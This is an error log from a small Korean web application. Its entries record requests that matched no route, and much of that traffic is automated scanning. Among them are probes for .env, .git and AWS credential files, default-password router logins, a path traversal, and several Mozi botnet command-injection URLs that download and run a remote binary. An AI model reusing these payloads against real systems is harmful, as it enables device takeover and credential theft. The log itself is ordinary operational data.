{"level":"error","message":"GET /abcd 라우터가 없습니다."}
{"level":"error","message":"GET /abcd 라우터가 없습니다."}
{"level":"error","message":"GET /efgh 라우터가 없습니다."}
{"level":"error","message":"GET /efgh 라우터가 없습니다."}
{"level":"error","message":"GET /ijkl 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /solr/ 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /admin/ 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /sugar_version.json 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"GET /wordpress/ 라우터가 없습니다."}
{"level":"error","message":"GET /wp/ 라우터가 없습니다."}
{"level":"error","message":"GET /blog/ 라우터가 없습니다."}
{"level":"error","message":"GET /old/ 라우터가 없습니다."}
{"level":"error","message":"GET /new/ 라우터가 없습니다."}
{"level":"error","message":"GET /test/ 라우터가 없습니다."}
{"level":"error","message":"GET /backup/ 라우터가 없습니다."}
{"level":"error","message":"GET /temp/ 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /client/get_targets 라우터가 없습니다."}
{"level":"error","message":"GET /upl.php 라우터가 없습니다."}
{"level":"error","message":"GET /geoip/ 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /1.php 라우터가 없습니다."}
{"level":"error","message":"GET /bundle.js 라우터가 없습니다."}
{"level":"error","message":"GET /files/ 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"POST /HNAP1/ 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /memo 라우터가 없습니다."}
{"level":"error","message":"GET /auto 라우터가 없습니다."}
{"level":"error","message":"GET /auth 라우터가 없습니다."}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"error","message":"GET /auth 라우터가 없습니다."}
{"level":"error","message":"GET /auth 라우터가 없습니다."}
{"level":"error","message":"GET /auth/signin 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /auth/signup 라우터가 없습니다."}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"error","message":"GET /auth/signup 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /client/get_targets 라우터가 없습니다."}
{"level":"error","message":"GET /upl.php 라우터가 없습니다."}
{"level":"error","message":"GET /geoip/ 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /1.php 라우터가 없습니다."}
{"level":"error","message":"GET /bundle.js 라우터가 없습니다."}
{"level":"error","message":"GET /files/ 라우터가 없습니다."}
{"level":"error","message":"GET /portal/redlion 라우터가 없습니다."}
{"level":"error","message":"GET /actuator/health 라우터가 없습니다."}
{"level":"error","message":"GET /hudson 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"OPTIONS / 라우터가 없습니다."}
{"level":"error","message":"GET /expenditure/expendYear?year=2023 라우터가 없습니다."}
{"level":"error","message":"GET /expenditure/expendYear?year=2023 라우터가 없습니다."}
{"level":"error","message":"GET /expenditure/expendYear?year=2023 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /robots.txt 라우터가 없습니다."}
{"level":"error","message":"GET /robots.txt 라우터가 없습니다."}
{"level":"error","message":"GET /99vt 라우터가 없습니다."}
{"level":"error","message":"GET /gate.php 라우터가 없습니다."}
{"level":"error","message":"GET /aaaaaaaaaaaaaaaaaaaaaaaaaqr 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /99vu 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET http://www.google.com/ 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /wp-includes/css/buttons.css 라우터가 없습니다."}
{"level":"error","message":"GET /media/system/js/core.js 라우터가 없습니다."}
{"level":"error","message":"GET /boaform/admin/formLogin?username=admin&psd=admin 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /boaform/admin/formLogin?username=user&psd=user 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /Telerik.Web.UI.WebResource.axd?type=rau 라우터가 없습니다."}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /geoserver/web/ 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"POST /grouppurchase/creategp 라우터가 없습니다."}
{"level":"error","message":"GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 라우터가 없습니다."}
{"level":"error","message":"GET /../../mnt/mtd/Config/Account2 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/gpList 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/gplist 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /boaform/admin/formLogin?username=adminisp&psd=adminisp 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /robots.txt 라우터가 없습니다."}
{"level":"error","message":"GET /sitemap.xml 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/searchgplist?q=%EB%84%88%EA%B5%AC%EB%A6%AC 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/searchgplist?question=%EB%84%88%EA%B5%AC%EB%A6%AC 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/searchgplist?question=%EB%84%88%EA%B5%AC%EB%A6%AC 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/searchgplist?question=%EB%84%88%EA%B5%AC%EB%A6%AC 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET /druid/index.html 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.svn/wc.db 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /manager/html 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 라우터가 없습니다."}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"error","message":"GET /data/.svn/wc.db 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.git/HEAD 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /client/get_targets 라우터가 없습니다."}
{"level":"error","message":"GET /upl.php 라우터가 없습니다."}
{"level":"error","message":"GET /geoip/ 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /1.php 라우터가 없습니다."}
{"level":"error","message":"GET /bundle.js 라우터가 없습니다."}
{"level":"error","message":"GET /files/ 라우터가 없습니다."}
{"level":"error","message":"GET /utils/.git/config 라우터가 없습니다."}
{"level":"error","message":"GET /.git/HEAD 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET /manager/text/list 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /manager/html 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"error","message":"GET /phpunit.xml 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /geoserver/web/ 라우터가 없습니다."}
{"level":"error","message":"GET /shell?cd+/tmp;rm+-rf+*;wget+http://203.115.85.112:36578/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 라우터가 없습니다."}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /config/getuser?index=0 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /client/get_targets 라우터가 없습니다."}
{"level":"error","message":"GET /upl.php 라우터가 없습니다."}
{"level":"error","message":"GET /geoip/ 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /1.php 라우터가 없습니다."}
{"level":"error","message":"GET /bundle.js 라우터가 없습니다."}
{"level":"error","message":"GET /files/ 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /?20628182016134805143312Ex 라우터가 없습니다."}
{"level":"error","message":"GET /admin/config.php 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET /_profiler/phpinfo 라우터가 없습니다."}
{"level":"error","message":"GET /phpinfo.php 라우터가 없습니다."}
{"level":"error","message":"GET /phpinfo 라우터가 없습니다."}
{"level":"error","message":"GET /aws.yml 라우터가 없습니다."}
{"level":"error","message":"GET /.env.bak 라우터가 없습니다."}
{"level":"error","message":"GET /info.php 라우터가 없습니다."}
{"level":"error","message":"GET /.aws/credentials 라우터가 없습니다."}
{"level":"error","message":"GET /config/aws.yml 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /config.js 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"POST /HNAP1/ 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"HEAD / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET http://azenv.net/ 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /client/get_targets 라우터가 없습니다."}
{"level":"error","message":"GET /upl.php 라우터가 없습니다."}
{"level":"error","message":"GET /geoip/ 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /1.php 라우터가 없습니다."}
{"level":"error","message":"GET /bundle.js 라우터가 없습니다."}
{"level":"error","message":"GET /files/ 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET /geoserver/web/ 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /aws-config.php 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /Public/home/js/check.js 라우터가 없습니다."}
{"level":"error","message":"GET /static/admin/javascript/hetong.js 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /wp-includes/css/buttons.css 라우터가 없습니다."}
{"level":"error","message":"GET /media/system/js/core.js 라우터가 없습니다."}
{"level":"error","message":"GET http://www.google.com/ 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /portal/redlion 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /hudson 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"POST /groupbuying 라우터가 없습니다."}
{"level":"error","message":"POST /groupbuying 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"error","message":"GET /GGMijdksfjkjdf/?target=1&port=1&time=1&method=1key= 라우터가 없습니다."}
